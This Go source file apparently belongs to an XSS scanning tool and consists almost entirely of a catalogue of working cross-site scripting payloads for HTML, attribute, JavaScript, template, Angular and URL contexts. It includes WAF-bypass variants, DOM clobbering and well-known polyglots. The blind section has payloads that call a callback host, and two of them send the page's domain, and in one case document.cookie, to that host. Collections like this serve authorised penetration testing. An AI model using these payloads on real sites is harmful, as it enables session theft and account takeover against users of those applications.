package payloads

import "github.com/lcalzada-xor/xxss/v2/pkg/models"

// PayloadVector represents a single XSS payload template
type PayloadVector struct {
	Content       string
	Context       models.ReflectionContext // Primary context where this is effective
	Tags          []string                 // Tags for filtering (e.g., "blind", "reflected", "svg", "angular")
	Description   string
	RequiredChars []string // Characters required for this payload to work
}

// Common Payloads
var Vectors = []PayloadVector{
	// --- HTML Context ---
	{Content: "<svg onload=alert(1)>", Context: models.ContextHTML, Tags: []string{"reflected", "html", "svg"}, Description: "SVG onload", RequiredChars: []string{"<", ">", "=", "(", ")"}},
	{Content: "<img src=x onerror=alert(1)>", Context: models.ContextHTML, Tags: []string{"reflected", "html"}, Description: "Image onerror", RequiredChars: []string{"<", ">", "=", "(", ")"}},
	{Content: "<script>alert(1)</script>", Context: models.ContextHTML, Tags: []string{"reflected", "html"}, Description: "Standard script tag", RequiredChars: []string{"<", ">", "(", ")", "/"}},
	{Content: "<body onload=alert(1)>", Context: models.ContextHTML, Tags: []string{"reflected", "html"}, Description: "Body onload", RequiredChars: []string{"<", ">", "=", "(", ")"}},
	{Content: "<iframe src=javascript:alert(1)></iframe>", Context: models.ContextHTML, Tags: []string{"reflected", "html"}, Description: "Iframe javascript protocol", RequiredChars: []string{"<", ">", "=", "(", ")", ":", "/"}},
	{Content: "<details ontoggle=alert(1)>", Context: models.ContextHTML, Tags: []string{"reflected", "html"}, Description: "Details ontoggle", RequiredChars: []string{"<", ">", "=", "(", ")", "/"}},
	{Content: "<audio src=x onerror=alert(1)>", Context: models.ContextHTML, Tags: []string{"reflected", "html"}, Description: "Audio onerror", RequiredChars: []string{"<", ">", "=", "(", ")"}},
	{Content: "<video src=x onerror=alert(1)>", Context: models.ContextHTML, Tags: []string{"reflected", "html"}, Description: "Video onerror", RequiredChars: []string{"<", ">", "=", "(", ")"}},
	{Content: "<object data=javascript:alert(1)>", Context: models.ContextHTML, Tags: []string{"reflected", "html"}, Description: "Object data", RequiredChars: []string{"<", ">", "=", "(", ")", ":"}},
	{Content: "<script>confirm(1)</script>", Context: models.ContextHTML, Tags: []string{"reflected", "html", "waf"}, Description: "Confirm bypass", RequiredChars: []string{"<", ">", "(", ")", "/"}},
	{Content: "<script>prompt(1)</script>", Context: models.ContextHTML, Tags: []string{"reflected", "html", "waf"}, Description: "Prompt bypass", RequiredChars: []string{"<", ">", "(", ")", "/"}},
	{Content: "{{7*7}}", Context: models.ContextHTML, Tags: []string{"vue"}, Description: "Vue.js Template Injection", RequiredChars: []string{"{", "}", "*"}},

	// --- Advanced SVG ---
	{Content: "<svg><animate onbegin=alert(1) attributeName=x dur=1s>", Context: models.ContextHTML, Tags: []string{"reflected", "html", "svg", "animation"}, Description: "SVG Animate onbegin", RequiredChars: []string{"<", ">", "=", "(", ")"}},
	{Content: "<svg><set onbegin=alert(1) attributeName=x dur=1s>", Context: models.ContextHTML, Tags: []string{"reflected", "html", "svg", "animation"}, Description: "SVG Set onbegin", RequiredChars: []string{"<", ">", "=", "(", ")"}},
	{Content: "<svg><animateTransform onbegin=alert(1) attributeName=transform dur=1s>", Context: models.ContextHTML, Tags: []string{"reflected", "html", "svg", "animation"}, Description: "SVG AnimateTransform onbegin", RequiredChars: []string{"<", ">", "=", "(", ")"}},

	// --- Obscure Event Handlers ---
	{Content: "<div onanimationstart=alert(1) style=animation:s></div><style>@keyframes s{}</style>", Context: models.ContextHTML, Tags: []string{"reflected", "html", "event"}, Description: "Animation Start", RequiredChars: []string{"<", ">", "=", "(", ")", ":", "{", "}"}},
	{Content: "<div ontransitionend=alert(1) style=transition:1s></div>", Context: models.ContextHTML, Tags: []string{"reflected", "html", "event"}, Description: "Transition End", RequiredChars: []string{"<", ">", "=", "(", ")", ":"}},
	{Content: "<input onpointerover=alert(1)>", Context: models.ContextHTML, Tags: []string{"reflected", "html", "event"}, Description: "Pointer Over", RequiredChars: []string{"<", ">", "=", "(", ")"}},
	{Content: "<input onpointerdown=alert(1)>", Context: models.ContextHTML, Tags: []string{"reflected", "html", "event"}, Description: "Pointer Down", RequiredChars: []string{"<", ">", "=", "(", ")"}},
	{Content: "<input onauxclick=alert(1)>", Context: models.ContextHTML, Tags: []string{"reflected", "html", "event"}, Description: "Aux Click", RequiredChars: []string{"<", ">", "=", "(", ")"}},
	{Content: "<input onbeforeinput=alert(1)>", Context: models.ContextHTML, Tags: []string{"reflected", "html", "event"}, Description: "Before Input", RequiredChars: []string{"<", ">", "=", "(", ")"}},

	// --- Framework Specific ---
	{Content: "<div x-data=alert(1)></div>", Context: models.ContextHTML, Tags: []string{"reflected", "html", "alpine"}, Description: "Alpine.js x-data", RequiredChars: []string{"<", ">", "=", "(", ")", "-"}},
	{Content: "<div hx-on:load=alert(1)></div>", Context: models.ContextHTML, Tags: []string{"reflected", "html", "htmx"}, Description: "HTMX on load", RequiredChars: []string{"<", ">", "=", "(", ")", "-", ":"}},

	// --- DOM Clobbering ---
	{Content: "<form id=x><output id=y>I am x.y</output>", Context: models.ContextHTML, Tags: []string{"reflected", "html", "clobbering"}, Description: "DOM Clobbering Form Output", RequiredChars: []string{"<", ">", "=", " "}},
	{Content: "<a id=x href=javascript:alert(1)>", Context: models.ContextHTML, Tags: []string{"reflected", "html", "clobbering"}, Description: "DOM Clobbering Anchor", RequiredChars: []string{"<", ">", "=", ":"}},

	// --- Attribute Context ---
	{Content: "\"><script>alert(1)</script>", Context: models.ContextAttribute, Tags: []string{"reflected", "attribute", "breakout"}, Description: "Breakout double quote", RequiredChars: []string{"\"", ">", "<", "(", ")"}},
	{Content: "'><script>alert(1)</script>", Context: models.ContextAttribute, Tags: []string{"reflected", "attribute", "breakout"}, Description: "Breakout single quote", RequiredChars: []string{"'", ">", "<", "(", ")"}},
	{Content: "\" onmouseover=alert(1) x=\"", Context: models.ContextAttribute, Tags: []string{"reflected", "attribute", "event"}, Description: "Event handler with space, closer and quotes", RequiredChars: []string{"\"", "=", "(", ")", " "}},
	{Content: "\"/onmouseover=alert(1)/x=\"", Context: models.ContextAttribute, Tags: []string{"reflected", "attribute", "event"}, Description: "Event handler with slash, closer and quotes", RequiredChars: []string{"\"", "/", "=", "(", ")"}},
	{Content: "><script>alert(1)</script>", Context: models.ContextAttribute, Tags: []string{"reflected", "attribute", "breakout"}, Description: "Breakout no quote", RequiredChars: []string{">", "<", "(", ")"}},
	{Content: "/onmouseover=alert(1)/x=", Context: models.ContextAttribute, Tags: []string{"reflected", "attribute", "event"}, Description: "Event handler with slash and closer", RequiredChars: []string{"/", "=", "(", ")"}},
	{Content: "/onmouseover=alert(1)", Context: models.ContextAttribute, Tags: []string{"reflected", "attribute", "event"}, Description: "Event handler with slash", RequiredChars: []string{"/", "=", "(", ")"}},
	{Content: "onmouseover=alert(1)", Context: models.ContextAttribute, Tags: []string{"reflected", "attribute", "event"}, Description: "Event handler", RequiredChars: []string{"=", "(", ")"}},

	// --- JavaScript Context ---
	// --- JS String Breakouts ---
	{Content: "</script><img src=x onerror=alert(1)>", Context: models.ContextJSSingleQuote, Tags: []string{"reflected", "js", "script_breakout"}, Description: "Script Breakout (Single Quote Context)", RequiredChars: []string{"<", "/", ">", "=", "(", ")"}},
	{Content: "';alert(1);//", Context: models.ContextJSSingleQuote, Tags: []string{"reflected", "js", "single_quote"}, Description: "JS single quote breakout", RequiredChars: []string{"'", ";", "(", ")", "/"}},
	{Content: "';alert(1);'", Context: models.ContextJSSingleQuote, Tags: []string{"reflected", "js", "single_quote", "no_slash"}, Description: "JS single quote breakout no slash", RequiredChars: []string{"'", ";", "(", ")"}},
	{Content: "');alert(1);//", Context: models.ContextJSSingleQuote, Tags: []string{"reflected", "js", "single_quote", "balanced"}, Description: "JS single quote balanced parenthesis", RequiredChars: []string{"'", ")", ";", "(", "/"}},
	{Content: "')};alert(1);//", Context: models.ContextJSSingleQuote, Tags: []string{"reflected", "js", "single_quote", "balanced"}, Description: "JS single quote balanced brace", RequiredChars: []string{"'", ")", "}", ";", "(", "/"}},
	{Content: "</script><img src=x onerror=alert(1)>", Context: models.ContextJSDoubleQuote, Tags: []string{"reflected", "js", "script_breakout"}, Description: "Script Breakout (Double Quote Context)", RequiredChars: []string{"<", "/", ">", "=", "(", ")"}},
	{Content: "\";alert(1);\"", Context: models.ContextJSDoubleQuote, Tags: []string{"reflected", "js", "double_quote"}, Description: "JS double quote breakout", RequiredChars: []string{"\"", ";", "(", ")"}},
	{Content: "\";alert(1);//", Context: models.ContextJSDoubleQuote, Tags: []string{"reflected", "js", "double_quote"}, Description: "JS double quote breakout no comment", RequiredChars: []string{"\"", ";", "(", ")", "/"}},
	{Content: "\");alert(1);//", Context: models.ContextJSDoubleQuote, Tags: []string{"reflected", "js", "double_quote", "balanced"}, Description: "JS double quote balanced parenthesis", RequiredChars: []string{"\"", ")", ";", "(", "/"}},
	{Content: "\")};alert(1);//", Context: models.ContextJSDoubleQuote, Tags: []string{"reflected", "js", "double_quote", "balanced"}, Description: "JS double quote balanced brace", RequiredChars: []string{"\"", ")", "}", ";", "(", "/"}},
	{Content: "`+alert(1)+`", Context: models.ContextTemplateLiteral, Tags: []string{"reflected", "js", "template"}, Description: "Template literal breakout", RequiredChars: []string{"`", "+", "(", ")"}},
	{Content: "${alert(1)}", Context: models.ContextTemplateLiteral, Tags: []string{"reflected", "js", "template"}, Description: "Template literal interpolation", RequiredChars: []string{"$", "{", "}", "(", ")"}},
	// --- JS Raw / Eval ---
	{Content: "\\\"-alert(1)}//", Context: models.ContextJSRaw, Tags: []string{"reflected", "js_raw", "json_eval"}, Description: "JSON Eval Breakout (Backslash)", RequiredChars: []string{"\\", "\"", "-", "(", ")", "}", "/"}},
	{Content: ";alert(1);//", Context: models.ContextJSRaw, Tags: []string{"reflected", "js_raw"}, Description: "Standard JS Injection", RequiredChars: []string{";", "(", ")", "/"}},
	{Content: "alert(1)", Context: models.ContextJSRaw, Tags: []string{"reflected", "js", "raw"}, Description: "JS raw simple", RequiredChars: []string{"(", ")"}},

	// --- Special Contexts ---
	{Content: "javascript:alert(1)", Context: models.ContextURL, Tags: []string{"reflected", "url", "meta_refresh"}, Description: "Javascript protocol", RequiredChars: []string{":", "(", ")"}},
	{Content: "javascript:alert(1)", Context: models.ContextMetaRefresh, Tags: []string{"reflected", "meta_refresh"}, Description: "Javascript protocol for meta refresh", RequiredChars: []string{":", "(", ")"}},
	{Content: "data:text/html,<script>alert(1)</script>", Context: models.ContextDataURI, Tags: []string{"reflected", "data_uri"}, Description: "Data URI", RequiredChars: []string{":", ",", "<", ">", "(", ")"}},

	// --- Blind Payloads (using {{CALLBACK}}) ---
	{Content: "<script src={{CALLBACK}}></script>", Context: models.ContextHTML, Tags: []string{"blind", "html"}, Description: "Blind Script", RequiredChars: []string{"<", ">", "/"}},
	{Content: "<script>fetch('{{CALLBACK}}')</script>", Context: models.ContextHTML, Tags: []string{"blind", "html"}, Description: "Blind Fetch", RequiredChars: []string{"<", ">", "/", "(", ")", "'"}},
	{Content: "<img src={{CALLBACK}}>", Context: models.ContextHTML, Tags: []string{"blind", "html"}, Description: "Blind Image", RequiredChars: []string{"<", ">"}},
	{Content: "<img src=x onerror=fetch('{{CALLBACK}}')>", Context: models.ContextHTML, Tags: []string{"blind", "html"}, Description: "Blind Image OnError", RequiredChars: []string{"<", ">", "=", "(", ")", "'"}},
	{Content: "<svg onload=fetch('{{CALLBACK}}')>", Context: models.ContextHTML, Tags: []string{"blind", "html", "svg"}, Description: "Blind SVG", RequiredChars: []string{"<", ">", "=", "(", ")", "'"}},
	{Content: "<link rel=prefetch href={{CALLBACK}}>", Context: models.ContextHTML, Tags: []string{"blind", "html"}, Description: "Blind Prefetch", RequiredChars: []string{"<", ">", "="}},
	{Content: "javascript:fetch('{{CALLBACK}}')", Context: models.ContextURL, Tags: []string{"blind", "url"}, Description: "Blind JS Protocol", RequiredChars: []string{":", "(", ")", "'"}},
	{Content: "<iframe src={{CALLBACK}}>", Context: models.ContextHTML, Tags: []string{"blind", "html"}, Description: "Blind Iframe", RequiredChars: []string{"<", ">", "="}},
	{Content: "<script>new Image().src='{{CALLBACK}}'</script>", Context: models.ContextHTML, Tags: []string{"blind", "html"}, Description: "Blind Image Object", RequiredChars: []string{"<", ">", "/", "(", ")", ".", "=", "'"}},
	{Content: "<object data={{CALLBACK}}>", Context: models.ContextHTML, Tags: []string{"blind", "html"}, Description: "Blind Object", RequiredChars: []string{"<", ">", "="}},
	{Content: "<video src={{CALLBACK}} onerror=fetch('{{CALLBACK}}')>", Context: models.ContextHTML, Tags: []string{"blind", "html"}, Description: "Blind Video", RequiredChars: []string{"<", ">", "=", "(", ")", "'"}},
	{Content: "<meta http-equiv=refresh content='0;url={{CALLBACK}}'>", Context: models.ContextMetaRefresh, Tags: []string{"blind", "meta"}, Description: "Blind Meta Refresh", RequiredChars: []string{"<", ">", "=", ";", "'"}},
	{Content: "<details ontoggle=fetch('{{CALLBACK}}')>open", Context: models.ContextHTML, Tags: []string{"blind", "html"}, Description: "Blind Details", RequiredChars: []string{"<", ">", "=", "(", ")", "'"}},
	{Content: "<isindex formaction={{CALLBACK}}>", Context: models.ContextHTML, Tags: []string{"blind", "html"}, Description: "Blind Isindex", RequiredChars: []string{"<", ">", "="}},
	{Content: "j%0Aavas%0Dcript:fetch('{{CALLBACK}}')", Context: models.ContextURL, Tags: []string{"blind", "url"}, Description: "Blind Obfuscated JS", RequiredChars: []string{":", "(", ")", "'", "%"}},
	{Content: "<svg><animate onbegin=fetch('{{CALLBACK}}') attributeName=x dur=1s>", Context: models.ContextHTML, Tags: []string{"blind", "svg"}, Description: "Blind SVG Animate", RequiredChars: []string{"<", ">", "=", "(", ")", "'"}},
	{Content: "<body onload=fetch('{{CALLBACK}}')>", Context: models.ContextHTML, Tags: []string{"blind", "html"}, Description: "Blind Body Onload", RequiredChars: []string{"<", ">", "=", "(", ")", "'"}},
	{Content: "<iframe srcdoc=\"<img src=x onerror=fetch('{{CALLBACK}}')>\"></iframe>", Context: models.ContextHTML, Tags: []string{"blind", "html"}, Description: "Blind Iframe Srcdoc", RequiredChars: []string{"<", ">", "=", "(", ")", "'", "\""}},
	{Content: "<script>fetch('{{CALLBACK}}?d='+btoa(document.domain)+'&c='+btoa(document.cookie))</script>", Context: models.ContextHTML, Tags: []string{"blind", "html", "exfiltration"}, Description: "Blind Exfiltration Script", RequiredChars: []string{"<", ">", "/", "(", ")", "'", "+", ".", "&", "?"}},
	{Content: "<img src=x onerror=this.src='{{CALLBACK}}?d='+btoa(document.domain)>", Context: models.ContextHTML, Tags: []string{"blind", "html", "exfiltration"}, Description: "Blind Exfiltration Image", RequiredChars: []string{"<", ">", "=", "(", ")", "'", "+", ".", "?"}},
	{Content: "<img src='{{CALLBACK}}?", Context: models.ContextHTML, Tags: []string{"blind", "html", "dangling"}, Description: "Blind Dangling Markup", RequiredChars: []string{"<", ">", "=", "'", "?"}},

	// Blind JS Contexts
	{Content: ";fetch('{{CALLBACK}}');//", Context: models.ContextJSRaw, Tags: []string{"blind", "js", "raw"}, Description: "Blind JS Raw", RequiredChars: []string{";", "(", ")", "'", "/"}},
	{Content: "</script><script>fetch('{{CALLBACK}}')</script>", Context: models.ContextJSRaw, Tags: []string{"blind", "js"}, Description: "Blind JS Breakout", RequiredChars: []string{"<", ">", "/", "(", ")", "'"}},
	{Content: "';fetch('{{CALLBACK}}');//", Context: models.ContextJSSingleQuote, Tags: []string{"blind", "js", "single_quote"}, Description: "Blind JS Single Quote", RequiredChars: []string{"'", ";", "(", ")", "/"}},
	{Content: "\";fetch('{{CALLBACK}}');//", Context: models.ContextJSDoubleQuote, Tags: []string{"blind", "js", "double_quote"}, Description: "Blind JS Double Quote", RequiredChars: []string{"\"", ";", "(", ")", "/"}},

	// Blind Attribute Contexts
	{Content: "\" onload=fetch('{{CALLBACK}}') x=\"", Context: models.ContextAttribute, Tags: []string{"blind", "attribute"}, Description: "Blind Attribute Double Quote", RequiredChars: []string{"\"", "=", "(", ")", "'"}},
	{Content: "' onload=fetch('{{CALLBACK}}') x='", Context: models.ContextAttribute, Tags: []string{"blind", "attribute"}, Description: "Blind Attribute Single Quote", RequiredChars: []string{"'", "=", "(", ")", "'"}},
	{Content: "\"><img src=x onerror=fetch('{{CALLBACK}}')>", Context: models.ContextAttribute, Tags: []string{"blind", "attribute"}, Description: "Blind Attribute Breakout Double", RequiredChars: []string{"\"", ">", "<", "=", "(", ")", "'"}},
	{Content: "><img src=x onerror=fetch('{{CALLBACK}}')>", Context: models.ContextAttribute, Tags: []string{"blind", "attribute"}, Description: "Blind Attribute Breakout", RequiredChars: []string{">", "<", "=", "(", ")", "'"}},

	// Blind Angular
	{Content: "{{constructor.constructor('fetch(\"{{CALLBACK}}\")')()}}", Context: models.ContextAngular, Tags: []string{"blind", "angular"}, Description: "Blind Angular Constructor", RequiredChars: []string{"{", "}", ".", "(", ")", "'", "\""}},
	{Content: "{{$on.constructor('fetch(\"{{CALLBACK}}\")')()}}", Context: models.ContextAngular, Tags: []string{"blind", "angular"}, Description: "Blind Angular On", RequiredChars: []string{"{", "}", "$", ".", "(", ")", "'", "\""}},
	{Content: "{{[].pop.constructor('fetch(\"{{CALLBACK}}\")')()}}", Context: models.ContextAngular, Tags: []string{"blind", "angular"}, Description: "Blind Angular Array", RequiredChars: []string{"{", "}", "[", "]", ".", "(", ")", "'", "\""}},

	// Blind Template Literal
	{Content: "${fetch('{{CALLBACK}}')}", Context: models.ContextTemplateLiteral, Tags: []string{"blind", "js", "template"}, Description: "Blind Template Interpolation", RequiredChars: []string{"$", "{", "}", "(", ")", "'"}},
	{Content: "`+fetch('{{CALLBACK}}')+`", Context: models.ContextTemplateLiteral, Tags: []string{"blind", "js", "template"}, Description: "Blind Template Concatenation", RequiredChars: []string{"`", "+", "(", ")", "'"}},

	// --- Polyglots ---
	{Content: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=fetch('{{CALLBACK}}') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=fetch('{{CALLBACK}}')//>\\x3e", Context: models.ContextHTML, Tags: []string{"blind", "polyglot", "0xsobky"}, Description: "0xSobky's Polyglot (Blind)"},
	{Content: "javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/fetch('{{CALLBACK}}')//>", Context: models.ContextHTML, Tags: []string{"blind", "polyglot", "rsnake"}, Description: "Rsnake's Polyglot (Blind)"},
	{Content: "\"></script><script>/*{{CALLBACK}}*/fetch('{{CALLBACK}}')</script>", Context: models.ContextHTML, Tags: []string{"blind", "polyglot", "html_js_css"}, Description: "HTML/JS/CSS Polyglot (Blind)"},
	{Content: "<![CDATA[<]]> <svg/onload=fetch('{{CALLBACK}}')>", Context: models.ContextHTML, Tags: []string{"blind", "polyglot", "svg_xml"}, Description: "SVG/XML Polyglot (Blind)"},

	// Reflected Polyglot (Default)
	{Content: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e", Context: models.ContextHTML, Tags: []string{"reflected", "polyglot", "default"}, Description: "0xSobky's Polyglot (Reflected)"},
}

// hasTag checks if a slice contains a tag
func hasTag(tags []string, tag string) bool {
	for _, t := range tags {
		if t == tag {
			return true
		}
	}
	return false
}
